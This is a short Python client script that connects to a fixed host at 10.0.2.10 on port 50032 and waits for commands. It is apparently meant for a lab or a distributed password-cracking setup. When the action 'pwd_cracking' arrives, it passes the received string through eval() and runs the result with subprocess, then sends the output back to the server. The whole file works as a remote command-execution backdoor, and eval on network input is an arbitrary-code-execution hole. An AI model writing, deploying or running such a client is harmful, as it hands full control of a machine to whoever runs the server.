import socket
import subprocess

def execute_command(command):
    command = eval(command)
    p = subprocess.Popen(command, stdout=subprocess.PIPE)
    
    p.wait()
    return p.stdout.read().decode('utf-8')

ClientMultiSocket = socket.socket()
host = '10.0.2.10'
port = 50032

try:
    ClientMultiSocket.connect((host, port))
except socket.error as e:
    print(str(e))


while True:
    print("Connected to the server")
    print("Waiting for actions...")
    action = ClientMultiSocket.recv(1024)
    action_d = action.decode('utf-8')
    print("Action received: {}".format(action_d))
    if action_d == "connected":
        continue
    elif action_d == "pwd_cracking":
        command = ClientMultiSocket.recv(1024)
        output = execute_command(command.decode('utf-8'))
        ClientMultiSocket.send(str.encode(output))

ClientMultiSocket.close()